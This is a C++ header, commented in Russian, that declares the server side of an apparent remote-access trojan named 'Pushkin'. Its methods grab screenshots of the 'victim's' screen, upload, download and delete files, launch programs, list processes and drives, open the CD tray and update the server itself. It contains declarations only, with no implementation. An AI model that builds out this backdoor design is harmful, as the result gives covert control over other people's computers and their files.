#pragma once

#include <winsock2.h>
#include <list>

namespace PUSHKIN_SERVER
{
   // Класс-клиент (соединение с клиентом) - клиенты будут храниться в массиве типа vector
   class CPushkinServer;
   class CPushkinServClient
   {
      // Операции, инициированные клиентом
      int Authorize();                    // Авторизция пользователя
      int SendFile();                     // Отсылка файла
      int SendVersion();                  // Отсылка номера версии сервера
      int UpdateServer();                 // Обновление сервера, инициированное клиентом
      int UpdateServerImpl();             // Выгрузка и запуск программы обновления сервера
      int GetFileList();                  // Получение списка файлов и каталогов по данному пути
      int SendDrivesList();               // Получение списка логических дисков
      int ShowMessage();                  // Показ сообщения на экране
      int GetProcessList();               // Получение списка процессов в системе
      int OpenCDDoor();                   // Открытие дверцы CD-ROM'a
      int GetScreenShot();                // Получение скриншота с экрана жертвы
      int UploadFile();                   // Загрузка файла на сервер
      int ServCreateProcess();            // Запуск программы на выполнение
      int ServShellExecute();             // Запуск какого-либо файла, например, картинки или MP3
      int MaximizeWinampVolume();         // Сделать звук максимальным на Winamp'e
      int GetFilesTree();                 // Создание дерева файлов и каталогов
      int SendFilesList();                // Получение файлов из переданного списка
      int SendFreeSpace();                // Получение объема свободного места
      int DirectFileUpload();             // Прямая загрузка файлов с открытой шары или с другого места на сервере - средствами сервера
      int DeleteFile();                   // Удаление файла на сервере
      int GetFileEx();                    // Получение файла с докачкой
   public:
      CPushkinServer *server_p;       // Указатель на родителя
      SOCKET          m_socket;       // Сокет клиента
      sockaddr_in     m_client_addr;  // Информация о клиенте
      bool            m_bAuthorized;  // Признак того, что клиент авторизован

      CPushkinServClient();
      CPushkinServClient(const CPushkinServClient &cl_in);
      CPushkinServClient &operator=(const CPushkinServClient cl_in);
      ~CPushkinServClient();

      // Работа с клиентом
      int SendGreeting();                 // Посыл приветствия сервера
      int GetCommand(UINT &command);      // Принять команду от клиента (заголовок)

      // Обработка команды с клиента
      int ProcessCommand(UINT command);
   };

   // Описание класса-сервера - многопоточный сервер
   // (ждет соединения с клиентом открывает для него свой поток)
   class CPushkinServer
   {
      WSADATA      m_wsa_data;       // Информация о сокетах
      bool         m_bWinsockInited; // Признак того, что вызов WSAStartup уже был

      void InitStructures();

   public:
      SOCKET       m_socket;         // Серверный сокет
      bool         m_bStopServer;    // Признак того, что сервер нужно остановить

      CPushkinServer();              // Конструктор по умолчанию
      ~CPushkinServer();             // Деструктор

      int Init(int port_num);        // Инициализация сервера
      int Run();                     // Запуск сервера (обработка клиентов по очереди пока)
   };
}
